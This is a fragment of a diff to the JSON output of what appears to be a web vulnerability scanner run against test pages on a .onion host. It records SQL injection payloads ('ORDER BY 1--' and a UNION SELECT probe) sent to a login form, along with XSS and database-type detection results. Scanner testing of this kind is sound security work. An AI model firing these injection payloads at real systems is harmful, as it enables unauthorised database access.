+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "ORDER BY 1--",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
                                 "pwd": "1234"
                             }
                         }
@@ -340,15 +2292,10 @@
         }
     },
     "XSS Results": {
-        "XSS Results": {
-            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_xss/prueba_xss.html": {
-                "vulnerable_form": "submit.php",
-                "vulnerable": true
-            }
-        }
+        "XSS Results": {}
     },
     "Database Results": {
-        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_dbtype/prueba_dbtype.html": "MySQL",
+        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_dbtype/prueba_dbtype.html": "Unknown",
         "a": "Not accessible",
         "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/": "No form found"
     }
